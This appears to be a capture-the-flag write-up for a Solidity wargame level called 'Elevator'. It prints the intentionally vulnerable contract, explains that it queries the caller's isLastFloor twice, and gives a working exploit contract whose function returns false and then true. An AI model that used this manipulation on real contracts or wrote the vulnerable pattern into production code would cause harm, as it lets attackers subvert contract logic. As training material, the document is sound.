## 11. Elevator

Goal for this exercise is:

- Ride elevator to top floor


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
~~~

<br/>

Contract is calling `isLastFloor()` function from our address twice which allows manipulation.

Here is the code to solve this:
~~~
pragma solidity ^0.6.0;


interface Elevator {
  function goTo(uint _floor) external;
}


contract ElevatorExploit {
    Elevator elevator = Elevator(0x1234);

    address payable owner;

    uint public isLastFloorCounter = 0;


    // fund contract here    
    constructor() public payable {
        owner = msg.sender;
    }

    function callGoTo() public {
        // lets go to floor 10 and make it top floor
        elevator.goTo(10);
    }
    
    // elevator will call here
    function isLastFloor(uint) public returns (bool) {
        isLastFloorCounter ++;
        
        if (isLastFloorCounter < 2) {
            return false;    
        } else {
            return true;
        }
        
    }
    
    // get funds back
    function debugWithdraw() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
}
~~~